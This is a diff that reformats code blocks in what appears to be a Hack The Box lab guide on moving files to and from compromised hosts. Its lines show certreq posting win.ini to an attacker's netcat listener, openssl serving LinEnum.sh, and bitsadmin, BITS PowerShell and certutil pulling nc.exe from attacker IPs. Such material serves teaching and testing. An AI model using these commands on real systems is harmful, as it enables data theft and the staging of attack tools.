@@ -38,8 +38,7 @@ We need to listen on a port on our attack host for incoming traffic using Netcat
 
 #### Upload win.ini to our Pwnbox
 
-```
-        cmd
+```bat
 C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
 Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
 ```
@@ -48,8 +47,7 @@ This will send the file to our Netcat session, and we can copy-paste its content
 
 #### File Received in our Netcat Session
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 8000
 
 listening on [any] 8000 ...
@@ -86,8 +84,7 @@ We need to create a certificate and start a server in our Pwnbox.
 
 #### Create Certificate in our Pwnbox
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
 
 Generating a RSA private key
@@ -113,8 +110,7 @@ Email Address []:
 
 #### Stand up the Server in our Pwnbox
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
 ```
 
@@ -122,8 +118,7 @@ Next, with the server running, we need to download the file from the compromised
 
 #### Download File from the Compromised Machine
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
 ```
 
@@ -137,8 +132,7 @@ The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/
 
 #### File Download with Bitsadmin
 
-```
-        powershell
+```powershell
 PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
 ```
 
@@ -146,8 +140,7 @@ PowerShell also enables interaction with BITS, enables file downloads and upload
 
 #### Download
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
 ```
 
@@ -159,8 +152,7 @@ Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil 
 
 #### Download a File with Certutil
 
-```
-        cmd
+```bat
 C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 ```
 
